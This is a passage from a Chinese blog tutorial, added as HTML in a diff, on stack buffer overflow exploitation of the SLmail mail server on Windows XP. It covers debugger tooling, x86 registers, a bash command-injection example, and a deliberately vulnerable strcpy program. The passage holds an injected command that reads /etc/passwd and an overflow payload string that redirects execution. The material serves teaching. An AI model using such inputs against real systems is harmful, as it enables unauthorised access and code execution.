@@ -1,0 +1,1606 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    mediumzoom: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="引言: 改变它的运行轨迹,违背从前的规则,让它按照我的指引">
+<meta name="keywords" content="stackoverflow,assembly">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows 缓冲区溢出 (SLmail)">
+<meta property="og:url" content="http://alopex.cc/2022/08/18/bof-winXP/index.html">
+<meta property="og:site_name" content="Alopex">
+<meta property="og:description" content="引言: 改变它的运行轨迹,违背从前的规则,让它按照我的指引">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/topo.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/food-photographer-jennifer-pallian-X2gM-SIufpU-unsplash.jpg">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/input.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/input2.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/Stack_Overflow_2.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/Stack_Overflow_3.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/Stack_Overflow_4.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/register.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/ports.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/hello.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/attach.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/slmail.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/immunity.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/running.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/2700.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/paused.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/continue.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/EIP.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/9iD8.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/locate.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/EIP_locate.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/follow_in_dump.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/hex.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/0a.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/jmp.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/modules.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/slmfc.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/5f4a358f.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/disassemble.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/ffe4.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/local.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/get_shell.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/remmina.png">
+<meta property="og:image" content="http://alopex.cc/2022/08/18/bof-winXP/gui.png">
+<meta property="og:updated_time" content="2022-08-22T14:39:01.943Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows 缓冲区溢出 (SLmail)">
+<meta name="twitter:description" content="引言: 改变它的运行轨迹,违背从前的规则,让它按照我的指引">
+<meta name="twitter:image" content="http://alopex.cc/2022/08/18/bof-winXP/topo.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://alopex.cc/2022/08/18/bof-winXP/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>windows 缓冲区溢出 (SLmail) | Alopex</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Alopex</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">止 定 静 安 虑 得</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://alopex.cc/2022/08/18/bof-winXP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Alopex Cheung">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Alopex">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">windows 缓冲区溢出 (SLmail)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2022-08-18 10:56:05" itemprop="dateCreated datePublished" datetime="2022-08-18T10:56:05+08:00">2022-08-18</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2022-08-22 22:39:01" itemprop="dateModified" datetime="2022-08-22T22:39:01+08:00">2022-08-22</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/linux/exploitation/" itemprop="url" rel="index"><span itemprop="name">exploitation</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/linux/exploitation/application/" itemprop="url" rel="index"><span itemprop="name">application</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          <br>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">23k</span>
+            </span>
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">38 分钟</span>
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="引言"><a href="#引言" class="headerlink" title="引言:"></a>引言:</h1><blockquote>
+<p>改变它的运行轨迹,违背从前的规则,让它按照我的指引</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h2><ul>
+<li><p>目标主机</p>
+<ul>
+<li>Windows XP professional 32bit</li>
+<li>Version 5.1 (Build 2600.xpsp_sp3_qfe.130704-0421: Service Pack 3)</li>
+</ul>
+</li>
+<li><p>本地主机</p>
+<ul>
+<li>Linux kaliAMD64 5.16.0-kali7-amd64</li>
+<li>Debian 5.16.18-1kali1 (2022-04-01) x86_64 GNU/Linux</li>
+</ul>
+</li>
+<li><p>拓扑图<br><img src="topo.png" alt="topology"></p>
+</li>
+</ul>
+<h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ul>
+<li><p>slmail</p>
+<ul>
+<li>版本: 5.5</li>
+<li>介绍: SLMail is SMTP and POP3 email server software for Microsoft™ Windows NT and 2000.</li>
+<li>下载: <a href="https://slmail.software.informer.com/download/" target="_blank" rel="noopener">点击下载</a></li>
+<li>安装: 目标主机</li>
+<li>说明: 本软件是一个邮件服务器软件, 后续将对其进行缓冲区溢出</li>
+</ul>
+</li>
+<li><p>Immunity Debugger</p>
+<ul>
+<li>版本: 1.85</li>
+<li>介绍: Immunity Debugger is a powerful new way to write exploits, analyze malware, and reverse engineer binary files.</li>
+<li>下载: <a href="https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Immunity-Debugger.shtml" target="_blank" rel="noopener">点击下载</a></li>
+<li>安装: 目标主机</li>
+<li>说明: 本软件是图形化的debug工具, 提供可视化以便操作, 另外作为<code>mona.py</code>脚本的执行平台</li>
+</ul>
+</li>
+<li><p>mona</p>
+<ul>
+<li>版本: NA</li>
+<li>介绍: Mona.py is a python script that can be used to automate and speed up specific searches while developing exploits (typically for the Windows platform). It runs on Immunity Debugger and WinDBG, and requires python 2.7.</li>
+<li>下载: <a href="https://github.com/corelan/mona" target="_blank" rel="noopener">点击下载</a></li>
+<li>安装: 目标主机</li>
+<li>说明: 脚本<code>mona.py</code>, 为方便我们查找系统中可被利用的系统模块</li>
+</ul>
+</li>
+</ul>
+<h2 id="机器语言-amp-汇编-amp-C语言"><a href="#机器语言-amp-汇编-amp-C语言" class="headerlink" title="机器语言&amp;汇编&amp;C语言"></a>机器语言&amp;汇编&amp;C语言</h2><p>为了使和计算机沟通这件事更简单，人们花了很大的力气。<br>在内容的显示上，人们把单独的0101, 封装成一个便于表述的单元（<code>字节Byte</code>）。一个<code>字节</code>表示8个二进制数（Binary），如<code>11101010</code>。有了描述的名称，我们现在需要一个更先进的显示方式，于是16进制（Hexadecimal）被发现了，它通过将<code>4个二进制数</code>封装为<code>1个16进制</code>符号对内容进行压缩，显示的便利性得到了解决（<code>1110 1010</code> –&gt; <code>EA</code>）。<br>在执行指令上，计算机CPU只认识0101，无论是<code>数据</code>还是<code>操作指令</code>，微观上看都被视为0101，CPU本身并去区分数据和指令。CPU的职责是专注履行它该做的事情，即提取指令<code>Fetch</code>，解析指令<code>Decode</code>，执行指令<code>Execute</code>，进行一个又一个指令周期<code>Instruction cycle</code>的循环，起到指挥控制作用的是CPU时钟<code>clock pluse</code>。</p>
+<ul>
+<li>Fetch<ul>
+<li>从当前存储在<code>程序计数器</code>（Program Counter）中的内存地址中取出下一条指令，并存储到<code>指令寄存器</code>（Instruction Register）中。在取指操作结束时，<code>PC</code>指向将在下一个周期读取的下一条指令。</li>
+</ul>
+</li>
+<li>Decode<ul>
+<li><code>指令寄存器</code>（Instruction Register）中呈现的编码指令将由解码器解释<ul>
+<li>需读取有效地址： 数据存放在寄存器或内存中，由此产生了直接寻址和间接寻址的问题<ul>
+<li>直接寻址：它包含数据的实际地址<ul>
+<li>获取方式：首先通过指令读取地址，然后读取数据</li>
+</ul>
+</li>
+<li>间接寻址：它包含实际地址所在的内存位置的有效地址<ul>
+<li>获取方式：首先通过指令读取有效地址，然后读取实际地址，最后得到数据。</li>
+<li>寻址方式：即寄存器间接/内存间接</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>无需获得有效地址<ul>
+<li>如果指令是直接指令，则在此时钟脉冲期间什么都不做。如果这是 I/O 指令或寄存器指令，则在时钟脉冲期间执行操作</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Execute<ul>
+<li>CPU 的控制单元将解码后的信息作为一系列控制信号传递给 CPU 的相关功能单元，以执行指令所需的动作，例如从寄存器中读取值，将它们传递给 ALU 执行数学或逻辑运算函数，并将结果写回寄存器。如果涉及 ALU，它会将条件信号发送回 CPU。操作生成的结果存储在主存储器中或发送到输出设备。根据来自 ALU 的反馈，PC 可能会更新到不同的地址，下一条指令将从该地址中取出。<br>其中，需要指出的是，<code>PC（Program Counter）</code>作用是指向下一条要执行的指令，是一个抽象的概念术语，其具体实现是基于<code>CS（code segment）:IP（instruction pointer）</code>这两个寄存器来实现的。<br>8086CPU的计算方式：<blockquote>
+<blockquote>
+<p>段地址×16+偏移地址=物理地址  </p>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<p>不难发现，指令周期是CPU执行代码的运行逻辑。为了脱离0101的束缚，人们开始将特定组合的0101<code>指令</code>封装成了一个个更为<code>衣冠楚楚</code>易于辨识的单词/简写。让写程序变成一件更接近“人”干的事情，让使用机器语言来编程成为了尘封往事。这首要的第一件事便是立名，通过对寄存器<code>register</code>使用习惯的不同，人们将其划分为三类<code>通用寄存器</code>，段寄存器<code>和</code>控制寄存器`。</p>
+<ul>
+<li>通用寄存器(General registers)<ul>
+<li>数据寄存器(Data registers)<ul>
+<li>EAX(Accumulator) / EBX(Base) / ECX(Count) / EDX(Data) : 存放数据</li>
+</ul>
+</li>
+<li>变址寄存器(Index registers)<ul>
+<li>ESI(Source Index)：字符串操作源指针</li>
+<li>EDI(Destination Index)：字符串操作目标指针</li>
+</ul>
+</li>
+<li>指针寄存器(Pointer registers)<ul>
+<li>EIP(Instruction Pointer)：保存着下一条要执行的指令的地址。程序运行时，CPU会读取EIP中的一条指令的地址，传送指令到指令缓冲区后，EIP寄存器的值自动增加，增加的大小即是读取指令的字节大小，即下一条指令的地址为当前指令的地址加上当前指令的长度。</li>
+<li>EBP(Base Pointer) ：SS段中堆栈内数据指针。EBP由高级语言用来引用参数和局部变量，通常称为堆栈基址指针寄存器。</li>
+<li>ESP(Stack Pointer)：SS段中堆栈指针。ESP用来寻址堆栈上的数据，ESP寄存器一般不参与算数运算。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>段寄存器(segment registers)<ul>
+<li>CS(Code Segment): 它包含所有要执行的指令</li>
+<li>DS(Data Segment): 它包含数据、常量和工作区</li>
+<li>SS(Stack Segment): 它包含过程或子例程的数据和返回地址</li>
+<li>ES(Extra Segment): 指内存中的一个段，它是内存中的另一个数据段</li>
+</ul>
+</li>
+<li>控制寄存器(flags/psw)<ul>
+<li>Overflow Flag (OF): 用来反应有符号数加减法运算所得结果是否溢出。运算超出当前运算位数所能表示的范围，则称为溢出，标志位被置为1，否则为0</li>
+<li>Direction Flag (DF): 用于串操作指令中，控制地址的变化方向。当DF为0时，存储器地址自动增加;当 DF为1时，存储器地址自动减少。</li>
+<li>Interrupt Flag (IF): 用于控制外部可屏蔽中断是否可以被处理器响应。</li>
+<li>Trap Flag (TF): 用于控制处理器是否进入单步操作方式。当TF为0时，处理器在正常模式下运行；当为1时，处理器单步执行指令，调试器可以逐步指令进行执行就是使用了该标志位。</li>
+<li>Sign Flag (SF): 用来反映运算结果是否为0。运算结果为负时置为1，否则为0。</li>
+<li>Zero Flag (ZF): 用来反映运算结果是否为0。为零时置为1，否则为0。</li>
+<li>Auxiliary Carry Flag (AF): 在字操作址，发生低字节向高字节进位或借位时该标志位被置为1，否则为0。</li>
+<li>Parity Flag (PF): 用于反应结果中“1”的个数的奇偶性。如果“1”为偶数置为1，否则为0。</li>
+<li>Carry Flag (CF): 运算结果的最高位产生了一个进位或错位，则该标志位置为1，否则为0。</li>
+</ul>
+</li>
+</ul>
+<p>一个个存放数字的<code>小格子</code>，从此有了属于它们的名称，大家使用的时候，通过名称进行调用，涉及的操作<code>加减成除</code>和<code>偏移中断触发</code>，当然也需要以名称一一标识，这就不一而足了。</p>
+<p>继续沿着指令执行的这条线，<code>CS</code>和<code>IP</code>都有了其相应的寄存器。指令的执行过程，正是通过<code>CS:IP</code>指向的内存地址读取指令，IP寄存器指指向下一条指令，执行相应指令，继续循环。这造就了一个有趣的现象，内存空间是有限的，如果我们设置一个无穷的循环，汇编要如何处理呢？答案是<code>跳转 JMP</code>。因为存放在内存中的指令有对应的内存地址，遇到重复/循环跳到此前地址执行，便可实现对“无穷”的循环。<br>通过<code>JMP</code>指令，给予对应的地址，它就可以跳转到相应的地址上，实现对内存地址存放代码的执行。对于需要他人集成代码的调用，这是意义深远的，有了<code>JMP</code>命令再提供一个内存地址，便能在内存中畅通无阻，实现对加载于内存中命令的执行。<br>汇编语言的出现，将冰冷的0101，封装成了人类较为易于识别的语言，例如让寄存器AX，增加10。机器语言是<code>6683C00A</code>，汇编便成为了<code>add ax, 0xa</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6683C00A          add ax, 0xa</span><br></pre></td></tr></table></figure>
+
+<p>符号的简化是伟大的，它让我们的表达有了质的提升！但并不全是，汇编语言无疑比机器语言容易理解，但表述上仍显得冗余。我们在说加法的时候，有一套十分完善简介的数学符号，计算机处理“数字”运算，这套数学符号的引入显得是那么理所应当。我们不会希望在计算<code>(1+2)*3/4</code>的时候，<code>add</code>，<code>mul</code>，<code>div</code>轮番上阵，更不希望每书写一个循环，就去考虑它如何跳转。我们希望输入的内容足够简明，计算机便能知晓。对于汇编的抽象成为了一个摆在眼前的问题，<code>C</code>语言应运而生，它对数据类型，循环，判断等结构都降维到了一个大家有一些基础就可以理解的程度，它足够的精简，满足的上手容易但精通困难的特点。它让程序的开发，有了一个质的改变，这个质的飞跃终于在这里得到了实现。</p>
+<blockquote>
+<blockquote>
+<p>小结：指令数据都而二进制，为了便于阅读标识，我们<code>8个2进制</code>表述为两个<code>16进制</code>组成<code>一个字节</code>进行表示。CPU在每个时钟周期里，提取命令，读取相应字节，执行<code>计算</code>操作，进行下一个周期，周而复始消化指令。而<code>JMP</code>命令的存在，使得代码的执行，不再简单遵循自上而下的顺序，有了在内存中傲游的机会。汇编语言的出现，简化了代码编写的难度，而<code>C</code>语言对其进行“封装”让程序编写变得更为便利。</p>
+</blockquote>
+</blockquote>
+<h1 id="正文内容"><a href="#正文内容" class="headerlink" title="正文内容"></a>正文内容</h1><p><img src="food-photographer-jennifer-pallian-X2gM-SIufpU-unsplash.jpg" alt="overflow"></p>
+<h2 id="一个漏洞"><a href="#一个漏洞" class="headerlink" title="一个漏洞"></a>一个漏洞</h2><p>一个简单的<code>bash</code>脚本漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;1&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行这个脚本，我们需要对其输入一个参数，它将会打印出来，就是那么简单。看似是人畜无害的一行代码，能有什么影响呢？<br>为了增加沉浸感，我们来一个假设，这个程序是嵌入在网页中的，用户在<code>输入框</code>中填写内容（即 ${1}），点击<code>Click me</code>或<code>「Enter」</code>执行。<br><img src="input.png" alt="input"></p>
+<p>对于普通的用户，这个程序出错的概率是很低的。但当有一天，一位用户在按「Enter」的时候，先错收按到的<code>\</code>，滑落到<code>「Enter」</code>。神奇的事情发生了，我们的程序没有按照预订规则，显示出了<code>&gt;</code>（换行显示），这让用户无意间发现了我们的程序，对于<code>特殊字符</code>的键入，并未进行检测。<br>利用不多的代码知识，一些用户摸清了我们后台用于回先显的代码是<code>bash</code>语言编写的。对于bash的理解和加上管道符的知识，用户实现了对非授权信息进行了访问。<br><img src="input2.png" alt="input2"></p>
+<blockquote>
+<blockquote>
+<p><code>cat /etc/passwd | xargs | tr  &#39; &#39; &#39;|&#39;</code></p>
+</blockquote>
+</blockquote>
+<p>看似是一行简单不存在逻辑漏洞的代码，当它遇到了别有用心的用户，其产生的碰撞是灾难性的。<br>像这样，程序未按如期设计执行，执行未经授权的操作，便是<code>漏洞利用（exploit）</code>。一个<code>静态</code>的程序是鲜有漏洞问题的，例如不提供输入的打印程序，但同时也是毫无用处的。程序需要接收用户的<code>输入</code>，以此来满足用户的各种需求，这是程序设计的出发点，对用户的<code>输入</code>进行<code>计算</code>产生<code>输出</code>，是一个程序执行的基本规则。即使向上面一个简单的程序，也是遵循用户输入参数，计算（执行显示），将输入输出到屏幕。<br>产生漏洞的原因在于，程序对用户的输入，并未进行任何的检测，直接输出使用。而在<code>bash</code>中，对于``的内容会被认定为执行的命令，因此首先执行得出结果，返回的结果被当作<code>参数1</code>进行输入“喂”给脚本程序，其再显示出来。最终引致，未授权信息被访问查看，导致敏感信息的泄漏。</p>
+<h2 id="缓冲区溢出攻击"><a href="#缓冲区溢出攻击" class="headerlink" title="缓冲区溢出攻击"></a>缓冲区溢出攻击</h2><p>缓冲区的攻击是诸多攻击中较为知名的一个，它的原理并不十分复杂。大体上是利用开发者对缓区知识的缺乏（一些基础知识缺失），在开发过程中开发者对输入信息未进行足够的检查或不假思索进行使用，导致为变量分配的空间，被攻击者突破并对主机实施恶意操控。<br>进一步来说，以<code>C</code>语言为例，程序员需要对变量进行定义，定义决定了两个要素，数据的数据的长度和类型。长度决定了数据的起始空间，从哪里开始到哪里结束，类型决定了数据展现的方式，是字符还是数值。<code>C</code>语言对汇编语言的封装是成功的，它的蔓延和风靡就是最好的证明。与此同时，<code>C</code>语言诞生的那个特殊时期，为其增添了十分独特的<code>历史色彩</code>。例如<code>指针(Pointer)</code>的存在，<code>goto</code>的关键字，还有那句<code>程序员应该知道自己在做什么</code>。可惜的是，自由是一个难以把控的东西。因为它有一个卵生兄弟，称为杂乱无章。在自由<code>野蛮生长</code>的年代，出现了许多天马行空的优秀软件，当然也有了稀奇古怪的<code>bug</code>。<br>下面的例子是一个简单的<code>栈缓冲区溢出</code>，<code>缓冲区</code>的溢出类型是多样的，栈溢出是一个经典案例。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span> <span class="params">(<span class="keyword">char</span> *bar)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span>  c[<span class="number">12</span>];</span><br><span class="line">   <span class="built_in">strcpy</span>(c, bar);  <span class="comment">// no bounds checking</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   foo(argv[<span class="number">1</span>]);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个程序的功能十分简单，接收一个用户输出的参数，将参数提交给函数<code>foo</code>，<code>foo</code>对参数进行复制。<br>特别就特别在，这个参数的复制并未进行输入长度的检查。程序员开放了一个有<code>12个格子</code>的变量<code>c</code>，由于字符串的特点末尾必须存放<code>\0</code>。因此格子实际可用空间为11,可是用户的传入不见得必定少于或等于11个字符，当输入的字符数量超过11时，程序便会<code>crash</code>，由于<code>strcpy</code>不对长度限制的特点，超出的字符仍然回被复制到内存中，覆盖现有代码段落的内容。而当应用程序执行完毕后，它需要将操作权归还给操作系统，此时定会存在一个返回地址。只要当我们，填入足够的<code>载荷（payload）</code>，在返回地址的位置，恰好写入一个<code>4字节</code>（32bit）的内存地址，便能让程序执行我们传入内存地址相关的代码，实现非法操控。</p>
+<p>以下是简单的图解:</p>
+<p><img src="Stack_Overflow_2.png" alt="sbo1"></p>
+<blockquote>
+<blockquote>
+<p>(初始化程序后，内存的示意图)</p>
+</blockquote>
+</blockquote>
+<p><img src="Stack_Overflow_3.png" alt="sbo2"></p>
+<blockquote>
+<blockquote>
+<p>(传入’hello’作为参数，正常运行的程序)</p>
+</blockquote>
+</blockquote>
+<p><img src="Stack_Overflow_4.png" alt="sbo3"></p>
+<blockquote>
+<blockquote>
+<p>(传入’A…A\x08\x35\xc0\x80’作为参数，让程序非法跳转到内存地址0x80c03508执行代码)</p>
+</blockquote>
+</blockquote>
+<h2 id="缓冲区攻击思路"><a href="#缓冲区攻击思路" class="headerlink" title="缓冲区攻击思路"></a>缓冲区攻击思路</h2><ol>
+<li>找到程序输入入口，进行大量字符的输入试探</li>
+<li>找到程序出现<code>crash</code>的门槛</li>
